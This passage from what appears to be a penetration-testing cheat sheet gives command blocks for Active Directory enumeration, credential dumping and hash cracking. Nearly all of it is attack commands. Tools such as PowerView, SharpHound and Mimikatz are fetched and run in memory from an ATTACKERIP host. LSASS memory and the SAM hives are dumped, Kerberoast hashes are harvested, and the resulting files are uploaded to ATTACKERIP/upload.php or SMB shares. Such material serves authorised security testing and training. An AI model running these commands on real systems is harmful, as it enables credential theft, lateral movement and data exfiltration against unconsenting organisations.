iex (new-object system.net.webclient).downloadstring("http://ATTACKERIP/tools/PowerView.ps1")

get-netdomain
get-domaincontroller
get-domainsid
get-domainuser | select -expand cn
get-domainuser -preauthnotrequired -verbose    #ASRep Roasting possibility
get-domainuser * -spn | get-domainspnticket -outputformat hashcat
get-netgroup | select -expand name
get-netgroupmember -membername "domain admins" -recurse | select membername
get-netuser -spn | select displayname, userprincipalname, serviceprincipalname
$Compsraw = get-netcomputer | select -expand name ; $Comps = @() ; Foreach( $obj in $Compsraw ) { $Comp = new-object psobject -property @{ hostname = $obj ; ip = (resolve-dnsname $obj -erroraction ignore).ipaddress } ; $Comps += $Comp } ; $Comps
get-netloggedon -computername localhost | ft -auto
get-domainpolicy
(get-domainpolicy)."to-enumerate-further"
get-netcomputer | get-netshare
invoke-sharefinder -checkshareaccess
find-localadminaccess -verbose
find-domainlocalgroupmember -verbose
find-domainuserlocation | select username, sessionfromname
```

```text

```


```bash
DOMAIN="" USER="" PASS="" DC_IP="" ; bloodhound-python -c all --zip -u ${USER} -p ${PASS} -d ${DOMAIN} -ns ${DC_IP}
```

```powershell
powershell -nop -ep bypass -c {& iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/SharpHound.ps1') ; Invoke-BloodHound -CollectionMethod All -Domain "" -ZipFileName bloodhound.zip -LDAPUser "" -LDAPPass "" -CollectAllProperties
```


Transfer files to kali system. For `Windows 2003` and similar systems, start `smb`.

```cmd
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'bloodHound.zip')"

powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile bloodHound.zip
```

```bash
sudo impacket-smbserver -smb2support r .
```

```cmd
copy bloodHound.zip \\ATTACKERIP\r\
```


#### Exploit Suggester


**Windows**

```cmd
systeminfo > systeminfo.txt
wmic qfe list full > qfe.txt
```


Transfer files to kali system. For `Windows 2003` and similar systems, start `smb`.

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'systeminfo.txt')
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'qfe.txt')

powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile systeminfo.txt
powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile qfe.txt
```

```bash
sudo impacket-smbserver -smb2support r .
```

```cmd
copy systeminfo.txt \\ATTACKERIP\r\
copy qfe.txt \\ATTACKERIP\r\
```


*Precompiled Kernel Exploits*

> https://github.com/SecWiki/windows-kernel-exploits


*WESNG*

```bash
python3 ${TOOLS_DIR}/windows/wesng/wes.py --color --exploits-only systeminfo.txt --severity critical --hide "Internet Explorer" Edge Flash --impact "Elevation of Privilege" "Remote Code Execution"
```

```bash
python3 ${TOOLS_DIR}/windows/wesng/wes.py --qfe qfe.txt
python3 ${TOOLS_DIR}/windows/wesng/wes.py --color --exploits-only --qfe qfe.txt --os "" --severity critical --hide "Internet Explorer" Edge Flash --impact "Elevation of Privilege" "Remote Code Execution"
```

```text

```


*Windows Exploit Suggester*

> https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
> Works only till `Windows Vista`

```bash
python2 ${TOOLS_DIR}/windows/Windows-Exploit-Suggester/windows-exploit-suggester.py --database ${TOOLS_DIR}/windows/Windows-Exploit-Suggester/2022-10-17-mssb.xls --systeminfo systeminfo.txt
```

```text

```


*Sherlock*

> https://github.com/rasta-mouse/Sherlock

```cmd
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Sysinternals/Sherlock.ps1','Sherlock.ps1')"
certutil -urlcache -f http://ATTACKERIP/tools/Sherlock.ps1 Sherlock.ps1

powershell -nop -ep bypass -c "import-module .\Sherlock.ps1 ; Find-AllVulns"
```

```text

```


**Linux**

```bash
/usr/share/linux-exploit-suggester/linux-exploit-suggester.sh -u ""
```

```bash
${TOOLS_DIR}/linux/linux-exploit-suggester-2.pl -k ""
```

```text

```


### Post Exploitation


#### Exploiting Interesting Files


```cmd
powershell -c "get-childitem -path C:\Users -recurse -erroraction silentlycontinue local.txt*"
powershell -c "get-childitem -path C:\Users -recurse -erroraction silentlycontinue proof.txt*"
powershell -c "get-childitem -path C:\Users -recurse -erroraction silentlycontinue network-secret.txt*"

dir /a /s /b "c:\users\*local.txt*"
dir /a /s /b "c:\users\*proof.txt*"
dir /a /s /b "c:\users\*network-secret.txt*"

findstr /si password "c:\users"

powershell -c "get-childitem -path C:\Users -recurse -erroraction silentlycontinue | out-file c-users.txt"
dir /a /s /b c:\users > c-users.txt

# For Windows 2003 and similar
dir /a /s /b "c:\documents and settings" > c-doc-set.txt
```

```bash
find / -type f -iname "local.txt*" 2>/dev/null ; echo done
find / -type f -iname "proof.txt*" 2>/dev/null ; echo done
find / -type f -iname "network-secret.txt*" 2>/dev/null ; echo done

ls -laR /home > home.txt

grep -irnE 'password|secret' /etc 2>/dev/null | grep -v ":#"
```

```text

```


Transfer files to kali system. For `Windows 2003` and similar systems, start `smb`.

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'c-users.txt')

powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile c-users.txt
```

```bash
sudo impacket-smbserver -smb2support r .
```

```cmd
copy c-doc-set.txt \\ATTACKERIP\r\
```

```bash
wget -O curl http://ATTACKERIP/tools/curl-32 ; chmod +x curl

curl -s -F "file=@home.txt" http://ATTACKERIP/upload.php
```


Analyze the files.

```bash
grep -vE '\AppData|VMware|USOShared|All Users|\Default|desktop.ini|.lnk|.url|ladm' c-users.txt
grep -vE '\AppData|VMware|USOShared|All Users|\Default|desktop.ini|.lnk|.url|ladm' c-doc-set.txt
```


#### Dumping the Hashes


##### Windows

**Mimikatz**

Use `sekurlsa::tickets kerberos::list` for ticket details.

```cmd
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv
reg save hklm\system system.hiv

powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Sysinternals/procdump64.exe','procdump.exe')"
certutil -urlcache -f http://ATTACKERIP/tools/Sysinternals/procdump64.exe procdump.exe

procdump.exe -accepteula -ma lsass.exe lsass.dmp

powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Invoke-Mimikatz-wrapper.ps1','Invoke-Mimikatz-wrapper.ps1')"
certutil -urlcache -f http://ATTACKERIP/tools/Invoke-Mimikatz-wrapper.ps1 Invoke-Mimikatz-wrapper.ps1

%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -c "iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/Invoke-Mimikatz-211.ps1') ; .\Invoke-Mimikatz-wrapper.ps1 | out-file mimi.out"

powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/mimikatz-64-211.exe','mimikatz.exe')"
certutil -urlcache -f "http://ATTACKERIP/tools/mimikatz-64-211.exe" "mimikatz.exe"
mimikatz privilege::debug token::elevate "lsadump::sam sam.hiv security.hiv" "lsadump::dcsync /all /csv" "sekurlsa::logonpasswords full" exit > mimi.out
```


Transfer files to kali system. For `Windows 2003` and similar systems, start `smb`.

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'mimi.out')

powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile mimi.out
```

```bash
sudo impacket-smbserver -smb2support r .
```

```cmd
copy mimi.out \\ATTACKERIP\r\
```


**Invoke-PowerDump**

```cmd
powershell.exe -nop -ep bypass -c "& {iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/Invoke-PowerDump.ps1'); Invoke-PowerDump | out-file powerdump.out}"
```


**Fgdump**

```bash
sudo impacket-smbserver -smb2support r .

copy \\ATTACKERIP\r\fgdump.exe .

fgdump.exe
START /B fgdump.exe
```


**Secretsdump**

```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL | tee -a secretsdump.txt
```


**Creddump**

For `Windows 10`, which uses different algorithm to store hashes, new version of `pwdump` to be used.

```bash
python2 ${TOOLS_DIR}/windows/creddump7/pwdump.py SYSTEM SAM
```


**Kerberoasting**

```cmd
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -c "iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/Invoke-Kerberoast.ps1') ; invoke-kerberoast -outputformat hashcat | select -expand hash | out-file -encoding ascii hashes.hashcat.kerberoast ; type hashes.hashcat.kerberoast"
```

Transfer files to kali system. For `Windows 2003` and similar systems, start `smb`.

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'hashes.hashcat.kerberoast')

powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile hashes.hashcat.kerberoast
```

```bash
sudo impacket-smbserver -smb2support r .
```

```cmd
copy hashes.hashcat.kerberoast \\ATTACKERIP\r\
```


##### Linux

```bash
cat /etc/shadow
```

```text

```


##### Samba

```bash
tdbtool /var/lib/samba/private/passdb.tdb dump
```

```text

```


#### Cracking the Hashes


If hashes are not cracked by `hashcat` use option `-r /usr/share/hashcat/rules/best64.rule`.


*Popular Wordlists*

> /usr/share/wfuzz/wordlist/others/common_pass.txt
> /usr/share/wordlists/fuzzdb/wordlists-user-passwd/passwds/weaksauce.txt
> /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt
> /usr/share/wordlists/SecLists/Passwords/bt4-password.txt
> /usr/share/wordlists/rockyou.txt
> /usr/share/wordlists/crackstation-human-only.txt


##### Windows

> Blank LM Hash - `aad3b435b51404eeaad3b435b51404ee`


```bash
hashcat -m 13100 -a 0 --force --quiet --potfile-disable -r /usr/share/hashcat/rules/best64.rule hashes.hashcat.kerberoast /usr/share/wordlists/rockyou.txt
```

```text

```


```bash
hashcat -m 1000 -a 0 --force --quiet --potfile-disable -O "" /usr/share/wordlists/rockyou.txt
```

```bash
echo "" > hash.txt ; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT --pot=/tmp/pot
```

```text

```


##### Linux

```bash
unshadow passwd.txt shadow.txt > unshadowed ; hashcat -m 1800 -a 0 --force --quiet --potfile-disable unshadowed /usr/share/wordlists/rockyou.txt
```

```text

```

```bash
hashcat -m 500 -a 0 --force --quiet --potfile-disable '' /usr/share/wordlists/rockyou.txt
```

```text

```

```bash
hashcat -m 1800 -a 0 --force --quiet --potfile-disable '' /usr/share/wordlists/rockyou.txt
```

```text

```


> Check in `crackstation.net` or `dcode.fr/en` for failed hashes.
